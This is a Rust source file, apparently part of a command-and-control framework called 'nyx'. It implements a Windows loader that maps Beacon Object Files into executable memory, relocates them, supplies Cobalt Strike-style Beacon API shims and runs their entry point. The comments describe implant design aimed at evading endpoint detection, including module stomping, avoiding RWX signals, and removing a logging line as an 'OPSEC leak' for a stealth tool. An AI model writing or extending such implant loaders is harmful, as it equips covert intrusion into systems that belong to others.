//! The Windows loader + executor.

use std::collections::HashMap;
use std::ffi::c_void;
use std::os::raw::c_char;

use nyx_coff::{apply, parse, SymbolResolver};

extern "system" {
    fn VirtualAlloc(
        addr: *mut c_void,
        size: usize,
        allocation_type: u32,
        protect: u32,
    ) -> *mut c_void;
}
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_SIZE: usize = 0x1000;

fn page(n: usize) -> usize {
    (n + PAGE_SIZE - 1) & !(PAGE_SIZE - 1)
}

/// Resolves COFF symbols: defined symbols (mapped by the loader) take priority,
/// then a caller-supplied external table (Beacon-API shims).
pub struct Resolver {
    pub externals: HashMap<String, u64>,
    pub defined: HashMap<String, u64>,
}

impl SymbolResolver for Resolver {
    fn resolve(&self, name: &str) -> Option<u64> {
        self.defined
            .get(name)
            .copied()
            .or_else(|| self.externals.get(name).copied())
    }
}

/// A loaded (mapped + relocated) BOF. `defined` maps symbol → absolute address
/// so callers can read results the BOF wrote to globals.
pub struct Loaded {
    pub defined: HashMap<String, u64>,
    pub entry: u64,
}

/// Load + relocate a COFF BOF into freshly-allocated executable memory.
/// `entry` is the symbol to call (usually `go`); `externals` maps external
/// symbol names (e.g. `BeaconPrintf`) to shim addresses.
pub fn load(blob: &[u8], entry: &str, externals: HashMap<String, u64>) -> Result<Loaded, String> {
    let coff = parse(blob).map_err(|e| format!("parse: {e:?}"))?;

    // Allocate one region big enough for every section's in-memory footprint
    // (use VirtualSize so .bss — RawSize 0 — still gets a slot).
    let total: usize = coff
        .sections
        .iter()
        .map(|s| page((s.virtual_size.max(s.raw.len() as u32)) as usize))
        .sum::<usize>()
        .max(PAGE_SIZE);
    // DEV-HARNESS ONLY: a single RWX region is the simplest way to load +
    // relocate + call a BOF. RWX is a loud EDR signal, so the Windows PIC
    // implant (crates/implant-win) must NOT do this — it uses module stomping +
    // per-section permissions (RX text / RW data) on the stealth-critical path.
    // Flipping this whole region to RX here would break BOFs that write .data
    // globals at runtime, so the proper per-section fix is deferred to the
    // implant's own loader (tracked as a deferred implant-win hardening item).
    let base = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            total,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if base.is_null() {
        return Err("VirtualAlloc failed".into());
    }

    // Place sections page-aligned, copy their raw bytes (the rest is zeroed by
    // the allocation — correct for .bss).
    let mut bases: Vec<u64> = Vec::with_capacity(coff.sections.len());
    let mut offset = 0usize;
    for s in &coff.sections {
        let addr = unsafe { (base as *mut u8).add(offset) } as u64;
        bases.push(addr);
        if !s.raw.is_empty() {
            unsafe { std::ptr::copy_nonoverlapping(s.raw.as_ptr(), addr as *mut u8, s.raw.len()) };
        }
        offset += page((s.virtual_size.max(s.raw.len() as u32)) as usize);
    }

    // Map defined symbols → absolute address.
    let mut defined: HashMap<String, u64> = HashMap::new();
    for sym in &coff.symbols {
        if sym.section_number >= 1 && (sym.section_number as usize) <= bases.len() {
            let addr = bases[(sym.section_number - 1) as usize] + sym.value as u64;
            defined.insert(sym.name.clone(), addr);
        }
    }

    // Apply relocations, patching the in-memory section bytes.
    let resolver = Resolver {
        externals,
        defined: defined.clone(),
    };
    for (i, s) in coff.sections.iter().enumerate() {
        if s.relocations.is_empty() {
            continue;
        }
        let patched = apply(s, &coff, bases[i], &resolver)
            .map_err(|e| format!("reloc `{}`: {:?}", s.name, e))?;
        unsafe {
            std::ptr::copy_nonoverlapping(patched.as_ptr(), bases[i] as *mut u8, patched.len())
        };
    }

    // Resolve the entry symbol.
    let entry_sym = coff
        .symbols
        .iter()
        .find(|s| s.name == entry)
        .ok_or_else(|| format!("entry symbol `{entry}` not found"))?;
    if entry_sym.section_number < 1 {
        return Err(format!("entry `{entry}` is external/undefined"));
    }
    let entry_addr = bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64;

    Ok(Loaded {
        defined,
        entry: entry_addr,
    })
}

extern "C" {
    fn BeaconPrintf();
    fn nyx_bof_reset();
    fn nyx_bof_output() -> *const c_char;
}

/// The Beacon-API external table (symbol name → shim address). Extends as more
/// of the CS ABI lands (BeaconDataParse, BeaconOutput, …).
fn beacon_apis() -> HashMap<String, u64> {
    let fp: unsafe extern "C" fn() = BeaconPrintf;
    let addr = fp as usize as u64;
    // (Removed an `eprintln!` that logged the shim's executable-memory address on
    // every BOF load — an OPSEC leak for a tool whose stated goal is stealth.)
    [("BeaconPrintf".to_string(), addr)].into_iter().collect()
}

/// Result of running a BOF: captured `BeaconPrintf` output + resolved symbols.
pub struct ExecResult {
    pub output: String,
    pub defined: HashMap<String, u64>,
}

/// Load + run a BOF's `go()`: wire up the Beacon-API externals, reset the
/// output buffer, call `go`, and return the captured output + symbol map.
pub fn execute(blob: &[u8]) -> Result<ExecResult, String> {
    let loaded = load(blob, "go", beacon_apis())?;
    unsafe {
        nyx_bof_reset();
        let go: extern "C" fn() = std::mem::transmute(loaded.entry);
        go();
        let output = std::ffi::CStr::from_ptr(nyx_bof_output())
            .to_string_lossy()
            .into_owned();
        Ok(ExecResult {
            output,
            defined: loaded.defined,
        })
    }
}
